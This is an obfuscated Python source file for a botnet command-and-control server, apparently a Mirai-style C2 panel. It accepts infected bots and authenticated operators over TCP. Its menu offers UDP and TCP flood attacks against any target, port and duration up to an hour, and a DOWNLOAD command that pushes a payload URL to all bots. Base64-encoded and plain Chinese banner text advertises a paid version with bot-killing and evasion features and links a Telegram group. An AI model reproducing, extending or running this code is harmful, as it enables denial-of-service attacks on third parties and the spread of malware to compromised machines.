import socket #line:1
import threading #line:2
import time #line:3
from random import choice #line:4
from colorama import init ,Fore ,Back #line:5
import base64 #line:6
import json #line:7
init (autoreset =False ,wrap =True )#line:9
config ={"host":"0.0.0.0","port":5282 ,"max_con":9999 }#line:14
client_list ={}#line:16
p =b"fCDmk43kvaDlpojpgLzov5nmmK/lhY3otLnniYgg5a6a5Yi25Yqf6IO95om+6L+bVEdAeXpzQ18y"#line:18
def title (O0O000O0OO00O0OO0 ,O00O00OO0OO00OOOO ):#line:20
    while 1 :#line:22
        try :#line:23
            O0O000O0OO00O0OO0 .send (f'\33]0; | [{len(client_list)}]| login as {O00O00OO0OO00OOOO} | {base64.b64decode(p).decode(encoding="utf-8")} \a'.encode ())#line:24
            time .sleep (2 )#line:25
        except :#line:26
            O0O000O0OO00O0OO0 .close ()#line:27
def sendd (O0O0000OOO0O000O0 ,O0O000000OO0OO00O ):#line:29
    O0O0000OOO0O000O0 .send (O0O000000OO0OO00O .encode (encoding ='UTF-8'))#line:30
def boardcast (O0O00OOOO000O000O ):#line:32
    O0O00OOOO000O000O +=Fore .RESET #line:33
    for O0OOO0OOO0OO00OOO in client_list .keys ():#line:34
        O0OOO0OOO0OO00OOO .send (O0O00OOOO000O000O .encode (encoding ='UTF-8'))#line:36
def pingpong (OOO0OO00O0OOOO00O ):#line:42
    while 1 :#line:44
        try :#line:45
            OOO0OO00O0OOOO00O .settimeout (20 )#line:46
            sendd (OOO0OO00O0OOOO00O ,"yoyo")#line:47
            OOOOOOO00000OO0OO =OOO0OO00O0OOOO00O .recv (1024 ).decode ()#line:48
            if "PONG"not in OOOOOOO00000OO0OO :#line:49
                OOO0OO00O0OOOO00O .close ()#line:50
                break #line:51
        except :#line:53
            OOO0OO00O0OOOO00O .close ()#line:55
            break #line:56
        time .sleep (5 )#line:57
    client_list .pop (OOO0OO00O0OOOO00O )#line:60
a =base64 .b64decode (b"5qyi6L+O5L2/55So5a6H5a6Z56WeYzI=").decode (encoding ="utf-8")#line:64
b =base64 .b64decode (b"6L6T5YWlP+iwg+eUqOaUu+WHu+iPnOWNlQ==").decode (encoding ="utf-8")#line:65
c =base64 .b64decode (b"5a+55LqG6L+Z5Liq5piv5YWN6LS554mIIOe7meS9oOS7rOi/meS6m+iKseWkp+mSseS5sOijgee8neeJiOeahOWeg+WcvkMy55qE5Lq655So55qE").decode (encoding ="utf-8")#line:66
d =base64 .b64decode (b"5pyJ6Ieq5ZCv5Yqo5Yqf6IO9IOi3n+enu+mZpGNtZGxpbmXlkoxhcmd2WzBd55qE5Yqf6IO9IOW3sue7j+WQiuaJk+mCo+S6m+Weg+WcvuS6hg==").decode (encoding ="utf-8")#line:67
e =base64 .b64decode (b"6ZyA6KaB5a6a5Yi25om+5oiRIEB5enNDXzI=").decode (encoding ="utf-8")#line:68
f =base64 .b64decode (b"5Lu35qC85LiN5L6/5a6cIOaMieeFp+S9oOeahOmcgOaxguadpSArIOWItuS9nOmcgOimgeaXtumXtA==").decode (encoding ="utf-8")#line:69
def banner (O00OO0OO00O0OOO0O ):#line:70
    O00OO0OO00O0OOO0O .send (f"{Fore.BLUE}               ,.         ,·´';{Fore.CYAN} '     ,., '                        \r\n".encode (encoding ='UTF-8'))#line:71
    O00OO0OO00O0OOO0O .send (f"{Fore.BLUE}      ;'´*´ ,'\       ,'  ';'\°{Fore.CYAN}  ,'   '`;                 ,·;'   \r\n".encode (encoding ='UTF-8'))#line:72
    O00OO0OO00O0OOO0O .send (f"{Fore.BLUE}      ;    ';::\      ;  ;::'\ {Fore.CYAN} ;    ,':\     ,'´¨';     '; ;'\  \r\n".encode (encoding ='UTF-8'))#line:73
    O00OO0OO00O0OOO0O .send (f"{Fore.BLUE}     ;      '\;'      ;  ;:::; {Fore.CYAN} ;    ';::'\  ,'   ,'\   ,' ,'::'\ \r\n".encode (encoding ='UTF-8'))#line:74
    O00OO0OO00O0OOO0O .send (f"{Fore.BLUE}    ,'  ,'`\   \      ;  ;:::; {Fore.CYAN} ',    ';::;','    ,'::\,'  ,':::; \r\n".encode (encoding ='UTF-8'))#line:75
    O00OO0OO00O0OOO0O .send (f"{Fore.BLUE}    ;  ;::;'\  '\    ;  ;:::;  {Fore.CYAN}  ';   ';:';,'     ;:::;' ,'::::;' \r\n".encode (encoding ='UTF-8'))#line:76
    O00OO0OO00O0OOO0O .send (f"{Fore.BLUE}   ;  ;:::;  '\  '\ ,'  ;:::;' {Fore.CYAN}    ';  ';:;' ,:';  ';:;'  ,'::::;  \r\n".encode (encoding ='UTF-8'))#line:77
    O00OO0OO00O0OOO0O .send (f"{Fore.BLUE}  ,' ,'::;'     '\   ¨ ,'\::;' {Fore.CYAN}      ';  '·' ,'::';  '·´ ,':::::;   \r\n".encode (encoding ='UTF-8'))#line:78
    O00OO0OO00O0OOO0O .send (f"{Fore.BLUE}  ;.'\::;        \`*´\::\; °   {Fore.CYAN}    \   /::::;\·-·'´\::::;·''   \r\n".encode (encoding ='UTF-8'))#line:79
    O00OO0OO00O0OOO0O .send (f"{Fore.BLUE}  \:::\'          '\:::\:' '   {Fore.CYAN}       \'´\:::;'  '\::::'\;'´      \r\n".encode (encoding ='UTF-8'))#line:80
    O00OO0OO00O0OOO0O .send (f"{Fore.BLUE}    \:'             `*´'‚      {Fore.CYAN}       '\:'\:/     '·-·'´'        \r\n".encode (encoding ='UTF-8'))#line:81
    O00OO0OO00O0OOO0O .send (f"{Fore.BLUE}                               {Fore.CYAN}        '´                     \r\n".encode (encoding ='UTF-8'))#line:82
    O00OO0OO00O0OOO0O .send (f"{Fore.BLUE}{a}\r\n".encode (encoding ='UTF-8'))#line:83
    O00OO0OO00O0OOO0O .send (f"{Fore.BLUE}{b}\r\n\r\n".encode (encoding ='UTF-8'))#line:84
    O00OO0OO00O0OOO0O .send (f"{Fore.WHITE}{c}\r\n".encode (encoding ='UTF-8'))#line:86
    O00OO0OO00O0OOO0O .send (f"{d}\r\n".encode (encoding ='UTF-8'))#line:87
    O00OO0OO00O0OOO0O .send (f"{e}\r\n".encode (encoding ='UTF-8'))#line:88
    O00OO0OO00O0OOO0O .send (f"{f}\r\n\r\n\r\n".encode (encoding ='UTF-8'))#line:89
def ATTACK_MENU (O00O00OOOO00OO0O0 ):#line:94
    for OO00OO0O00O0OOOOO in range (50 ):#line:96
        O00O00OOOO00OO0O0 .send ("\r\n".encode (encoding ='UTF-8'))#line:97
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . Loading".encode (encoding ='UTF-8'))#line:99
    time .sleep (0.05 )#line:100
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . ..".encode (encoding ='UTF-8'))#line:101
    time .sleep (0.05 )#line:102
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . ...".encode (encoding ='UTF-8'))#line:103
    time .sleep (0.05 )#line:104
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . ......".encode (encoding ='UTF-8'))#line:105
    time .sleep (0.5 )#line:106
    for OO00OO0O00O0OOOOO in range (50 ):#line:107
        O00O00OOOO00OO0O0 .send ("\r\n".encode (encoding ='UTF-8'))#line:108
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . {Fore.YELLOW}UDPFLOOD {Fore.RED}:{Fore.YELLOW}    UDPFLOOD WITH HIGH Gbps (default len=1024)\r\n".encode (encoding ='UTF-8'))#line:110
    time .sleep (0.1 )#line:111
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . {Fore.YELLOW}UDPPLAIN {Fore.RED}:{Fore.YELLOW}    UDPPLAIN WITH HIGHer PPS\r\n".encode (encoding ='UTF-8'))#line:112
    time .sleep (0.1 )#line:113
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . {Fore.YELLOW}TCPFLOOD {Fore.RED}:{Fore.YELLOW}    TCP PACKET FLOOD data=1024\r\n".encode (encoding ='UTF-8'))#line:114
    time .sleep (0.1 )#line:115
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . {Fore.YELLOW}TCPPLAIN {Fore.RED}:{Fore.YELLOW}    TCP PACKET FLOOD data=54\r\n".encode (encoding ='UTF-8'))#line:116
    time .sleep (0.1 )#line:117
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . {Fore.YELLOW}TCPSHAKE {Fore.RED}:{Fore.YELLOW}    FLOODING TCP SOCKET(not for dstat)\r\n".encode (encoding ='UTF-8'))#line:118
    time .sleep (0.1 )#line:119
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . {Fore.YELLOW}TCPKEEPALIVE {Fore.RED}:{Fore.YELLOW}FLOODING TCP SOCKET WITH KEEPALIVE(not for dstat)\r\n\r\n".encode (encoding ='UTF-8'))#line:120
    time .sleep (0.1 )#line:121
    time .sleep (0.1 )#line:125
    O00O00OOOO00OO0O0 .send (f" {Fore.YELLOW}L4 {Fore.RED}: [METHOD] [TARGET] [PORT] [TIME]\r\n\r\n".encode (encoding ='UTF-8'))#line:126
    time .sleep (1 )#line:127
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . {Fore.YELLOW}不厌其烦的打个广告，vip版有K马功能，Kill高cpu占用，Kill mirai特征的\r\n".encode (encoding ='UTF-8'))#line:128
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . {Fore.YELLOW}还有防K 绕过傻狗condi的乱K 和mirai的一些基本的检测跟无敌重启\r\n".encode (encoding ='UTF-8'))#line:129
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . {Fore.YELLOW}对了 还会有window版的马子 然后你也可以选择用putty连或者用我写的图形化对接\r\n".encode (encoding ='UTF-8'))#line:130
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . {Fore.YELLOW}TG群聊：https://t.me/yzsC_2 哼哼，程序仅供参考 哈哈，VIP版也只是给你们学习用 爱国爱党\r\n".encode (encoding ='UTF-8'))#line:131
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}~ . {Fore.YELLOW}\r\n".encode (encoding ='UTF-8'))#line:132
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}传马:\r\n".encode (encoding ='UTF-8'))#line:139
    O00O00OOOO00OO0O0 .send (f" {Fore.GREEN}DOWNLOAD [URL] [archname]\r\n".encode (encoding ='UTF-8'))#line:140
def panel (OO00O00OO0O0OOOO0 ):#line:143
    banner (OO00O00OO0O0OOOO0 )#line:144
    for O0O000O0O000O0O00 in range (50 ):#line:145
        OO00O00OO0O0OOOO0 .send ("\r\n".encode (encoding ='UTF-8'))#line:146
    banner (OO00O00OO0O0OOOO0 )#line:147
    OO00O00OO0O0OOOO0 .send (f"{Fore.GREEN}botnet@127.0.0.1 ~#{Fore.RESET}".encode (encoding ='UTF-8'))#line:148
    while 1 :#line:149
        try :#line:150
            O0O00O00O0O00OO00 =OO00O00OO0O0OOOO0 .recv (1024 ).decode ().strip ("\r\n")#line:152
            O00OO0OO0000O0OO0 =O0O00O00O0O00OO00 .split (" ")#line:153
            if not O0O00O00O0O00OO00 :#line:154
                continue #line:155
            O00OO00O00OO00OO0 =O00OO0OO0000O0OO0 [0 ].upper ()#line:156
            O00OO0OO0000O0OO0 [0 ]=O00OO00O00OO00OO0 #line:157
            if O00OO00O00OO00OO0 =="?"or O00OO00O00OO00OO0 =="HELP":#line:159
                ATTACK_MENU (OO00O00OO0O0OOOO0 )#line:160
            elif O00OO00O00OO00OO0 =="UDPFLOOD":#line:161
                if len (O00OO0OO0000O0OO0 )==4 :#line:162
                    if not int (O00OO0OO0000O0OO0 [3 ])>3600 :#line:163
                        boardcast (O0O00O00O0O00OO00 )#line:164
                        OO00O00OO0O0OOOO0 .send (b"attack sent!\r\n")#line:165
                    else :#line:166
                        OO00O00OO0O0OOOO0 .send (b"Time should lower than 3600\r\n")#line:167
                else :#line:168
                    OO00O00OO0O0OOOO0 .send (b"error\r\n")#line:169
            elif O00OO00O00OO00OO0 =="UDPPLAIN":#line:170
                if len (O00OO0OO0000O0OO0 )==4 :#line:171
                    if not int (O00OO0OO0000O0OO0 [3 ])>3600 :#line:172
                        boardcast (O0O00O00O0O00OO00 )#line:173
                        OO00O00OO0O0OOOO0 .send (b"attack sent!\r\n")#line:174
                    else :#line:175
                        OO00O00OO0O0OOOO0 .send (b"Time should lower than 3600\r\n")#line:176
                else :#line:177
                    OO00O00OO0O0OOOO0 .send (b"error\r\n")#line:178
            elif O00OO00O00OO00OO0 =="TCPFLOOD":#line:185
                if len (O00OO0OO0000O0OO0 )==4 :#line:186
                    if not int (O00OO0OO0000O0OO0 [3 ])>3600 :#line:187
                        boardcast (O0O00O00O0O00OO00 )#line:188
                        OO00O00OO0O0OOOO0 .send (b"attack sent!\r\n")#line:189
                    else :#line:190
                        OO00O00OO0O0OOOO0 .send (b"Time should lower than 3600\r\n")#line:191
                else :#line:192
                    OO00O00OO0O0OOOO0 .send (b"Error\r\n")#line:193
            elif O00OO00O00OO00OO0 =="TCPPLAIN":#line:194
                if len (O00OO0OO0000O0OO0 )==4 :#line:195
                    if not int (O00OO0OO0000O0OO0 [3 ])>3600 :#line:196
                        boardcast (O0O00O00O0O00OO00 )#line:197
                        OO00O00OO0O0OOOO0 .send (b"attack sent!\r\n")#line:198
                    else :#line:199
                        OO00O00OO0O0OOOO0 .send (b"Time should lower than 3600\r\n")#line:200
                else :#line:201
                    OO00O00OO0O0OOOO0 .send (b"Error\r\n")#line:202
            elif O00OO00O00OO00OO0 =="TCPSHAKE":#line:203
                if len (O00OO0OO0000O0OO0 )==4 :#line:204
                    if not int (O00OO0OO0000O0OO0 [3 ])>3600 :#line:205
                        boardcast (O0O00O00O0O00OO00 )#line:206
                        OO00O00OO0O0OOOO0 .send (b"attack sent!\r\n")#line:207
                    else :#line:208
                        OO00O00OO0O0OOOO0 .send (b"Time should lower than 3600\r\n")#line:209
                else :#line:210
                    OO00O00OO0O0OOOO0 .send (b"Error\r\n")#line:211
            elif O00OO00O00OO00OO0 =="TCPKEEPALIVE":#line:212
                if len (O00OO0OO0000O0OO0 )==4 :#line:213
                    if not int (O00OO0OO0000O0OO0 [3 ])>3600 :#line:214
                        boardcast (O0O00O00O0O00OO00 )#line:215
                        OO00O00OO0O0OOOO0 .send (b"attack sent!\r\n")#line:216
                    else :#line:217
                        OO00O00OO0O0OOOO0 .send (b"Time should lower than 3600\r\n")#line:218
                else :#line:219
                    OO00O00OO0O0OOOO0 .send (b"Error\r\n")#line:220
            elif O00OO00O00OO00OO0 =="DOWNLOAD":#line:221
                if len (O00OO0OO0000O0OO0 )==3 :#line:222
                    boardcast (O0O00O00O0O00OO00 )#line:224
                    OO00O00OO0O0OOOO0 .send (b"downloaded!\r\n")#line:225
                else :#line:227
                    OO00O00OO0O0OOOO0 .send (b"Error\r\n")#line:228
            elif O00OO00O00OO00OO0 =="EXIT":#line:229
                boardcast (O0O00O00O0O00OO00 )#line:232
                OO00O00OO0O0OOOO0 .send (b"drop!!\r\n")#line:233
            OO00O00OO0O0OOOO0 .send (f"\r\n{Fore.GREEN}botnet@127.0.0.1 ~#{Fore.RESET}".encode (encoding ='UTF-8'))#line:235
        except :#line:236
            pass #line:237
def API (OOOOOOO000O0O00O0 ):#line:241
    while True :#line:243
        try :#line:244
            OO0O000OOOO0O0000 =OOOOOOO000O0O00O0 .recv (1024 ).decode ().strip ("\r\n")#line:245
            O0O0OOO000O000O00 =OO0O000OOOO0O0000 .split (" ")#line:246
            O00000O00O00OOOO0 =O0O0OOO000O000O00 [0 ].upper ()#line:248
            O0O0OOO000O000O00 [0 ]=O00000O00O00OOOO0 #line:249
            print (O0O0OOO000O000O00 )#line:250
            if O00000O00O00OOOO0 =="UDPFLOOD":#line:252
                if len (O0O0OOO000O000O00 )==4 :#line:253
                    if not int (O0O0OOO000O000O00 [3 ])>3600 :#line:254
                        boardcast (OO0O000OOOO0O0000 )#line:255
                        OOOOOOO000O0O00O0 .send (b"attack sent!\r\n")#line:256
                        break #line:257
                    else :#line:258
                        OOOOOOO000O0O00O0 .send (b"Time should lower than 3600\r\n")#line:259
                else :#line:260
                    OOOOOOO000O0O00O0 .send (b"error\r\n")#line:261
            elif O00000O00O00OOOO0 =="UDPPLAIN":#line:262
                if len (O0O0OOO000O000O00 )==4 :#line:263
                    if not int (O0O0OOO000O000O00 [3 ])>3600 :#line:264
                        boardcast (OO0O000OOOO0O0000 )#line:265
                        OOOOOOO000O0O00O0 .send (b"attack sent!\r\n")#line:266
                        break #line:267
                    else :#line:268
                        OOOOOOO000O0O00O0 .send (b"Time should lower than 3600\r\n")#line:269
                else :#line:270
                    OOOOOOO000O0O00O0 .send (b"error\r\n")#line:271
            elif O00000O00O00OOOO0 =="TCPFLOOD":#line:278
                if len (O0O0OOO000O000O00 )==4 :#line:279
                    if not int (O0O0OOO000O000O00 [3 ])>3600 :#line:280
                        boardcast (OO0O000OOOO0O0000 )#line:281
                        OOOOOOO000O0O00O0 .send (b"attack sent!\r\n")#line:282
                        break #line:283
                    else :#line:284
                        OOOOOOO000O0O00O0 .send (b"Time should lower than 3600\r\n")#line:285
                else :#line:286
                    OOOOOOO000O0O00O0 .send (b"Error\r\n")#line:287
            elif O00000O00O00OOOO0 =="TCPPLAIN":#line:288
                if len (O0O0OOO000O000O00 )==4 :#line:289
                    if not int (O0O0OOO000O000O00 [3 ])>3600 :#line:290
                        boardcast (OO0O000OOOO0O0000 )#line:291
                        OOOOOOO000O0O00O0 .send (b"attack sent!\r\n")#line:292
                        break #line:293
                    else :#line:294
                        OOOOOOO000O0O00O0 .send (b"Time should lower than 3600\r\n")#line:295
                else :#line:296
                    OOOOOOO000O0O00O0 .send (b"Error\r\n")#line:297
            elif O00000O00O00OOOO0 =="TCPSHAKE":#line:298
                if len (O0O0OOO000O000O00 )==4 :#line:299
                    if not int (O0O0OOO000O000O00 [3 ])>3600 :#line:300
                        boardcast (OO0O000OOOO0O0000 )#line:301
                        OOOOOOO000O0O00O0 .send (b"attack sent!\r\n")#line:302
                        break #line:303
                    else :#line:304
                        OOOOOOO000O0O00O0 .send (b"Time should lower than 3600\r\n")#line:305
                else :#line:306
                    OOOOOOO000O0O00O0 .send (b"Error\r\n")#line:307
            elif O00000O00O00OOOO0 =="TCPKEEPALIVE":#line:308
                if len (O0O0OOO000O000O00 )==4 :#line:309
                    if not int (O0O0OOO000O000O00 [3 ])>3600 :#line:310
                        boardcast (OO0O000OOOO0O0000 )#line:311
                        OOOOOOO000O0O00O0 .send (b"attack sent!\r\n")#line:312
                        break #line:313
                    else :#line:314
                        OOOOOOO000O0O00O0 .send (b"Time should lower than 3600\r\n")#line:315
                else :#line:316
                    OOOOOOO000O0O00O0 .send (b"Error\r\n")#line:317
            elif O00000O00O00OOOO0 =="DOWNLOAD":#line:318
                if len (O0O0OOO000O000O00 )==3 :#line:319
                    boardcast (OO0O000OOOO0O0000 )#line:321
                    OOOOOOO000O0O00O0 .send (b"downloaded!\r\n")#line:322
                    break #line:323
                else :#line:324
                    OOOOOOO000O0O00O0 .send (b"Error\r\n")#line:325
            elif O00000O00O00OOOO0 =="EXIT":#line:326
                boardcast (OO0O000OOOO0O0000 )#line:329
                OOOOOOO000O0O00O0 .send (b"drop!!\r\n")#line:330
        except :#line:333
            OOOOOOO000O0O00O0 .close ()#line:334
def handler (O00O0OO000O00000O ,OO0000OOO0O0OOOO0 ):#line:341
    try :#line:343
        O00O0OO000O00000O .send (b"CONNECT\r\n")#line:344
        OO00O000OO0000OOO =O00O0OO000O00000O .recv (1024 )#line:345
        OOOO0OOO0O00O00O0 =OO00O000OO0000OOO .decode ().strip ("\r\n")#line:346
        if OOOO0OOO0O00O00O0 ==key :#line:348
            O000O0O0OO0OOO000 =key #line:349
            O00O00OOO00O000O0 =O00O0OO000O00000O #line:350
            threading .Thread (target =panel ,args =(O00O00OOO00O000O0 ,)).start ()#line:351
            threading .Thread (target =title ,args =(O00O0OO000O00000O ,O000O0O0OO0OOO000 )).start ()#line:352
        elif "API"in OOOO0OOO0O00O00O0 :#line:354
            print ("API LOAD")#line:355
            threading .Thread (target =API ,args =(O00O0OO000O00000O ,)).start ()#line:356
        elif "BOSS"in OOOO0OOO0O00O00O0 :#line:357
            for OO0O00OO0OOOO0000 in client_list .values ():#line:358
                if OO0000OOO0O0OOOO0 ==OO0O00OO0OOOO0000 :#line:359
                    time .sleep (5 )#line:360
                    for O0O00OO0OOOOO00O0 in client_list .values ():#line:361
                        if OO0000OOO0O0OOOO0 ==O0O00OO0OOOOO00O0 :#line:362
                            O00O0OO000O00000O .send (b"fuckoff")#line:363
                            O00O0OO000O00000O .close ()#line:364
                            return #line:365
            O00O0OO000O00000O .send (b"yo")#line:366
            threading .Thread (target =pingpong ,args =(O00O0OO000O00000O ,)).start ()#line:367
            client_list .update ({O00O0OO000O00000O :OO0000OOO0O0OOOO0 })#line:368
    except :#line:374
        pass #line:375
import sys #line:378
def startm ():#line:379
    global C2 #line:381
    global key #line:382
    key =sys .argv [1 ]#line:383
    C2 =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )#line:384
    C2 .bind ((config ["host"],config ["port"]))#line:387
    C2 .listen (config ["max_con"])#line:388
    C2 .setsockopt (socket .SOL_SOCKET ,socket .SO_KEEPALIVE ,1 )#line:389
    C2 .setsockopt (socket .SOL_SOCKET ,socket .SO_REUSEADDR ,1 )#line:390
    print (f'LISTENING ON {config["host"]}:{config["port"]}')#line:392
    while 1 :#line:395
        OOO0O00000O00OO00 ,O0OO000OO00O000O0 =C2 .accept ()#line:396
        O00O00O000OO00OOO =threading .Thread (target =handler ,args =(OOO0O00000O00OO00 ,O0OO000OO00O000O0 [0 ]))#line:398
        O00O00O000OO00OOO .start ()#line:399
if __name__ =="__main__":#line:402
    startm ()#line:403
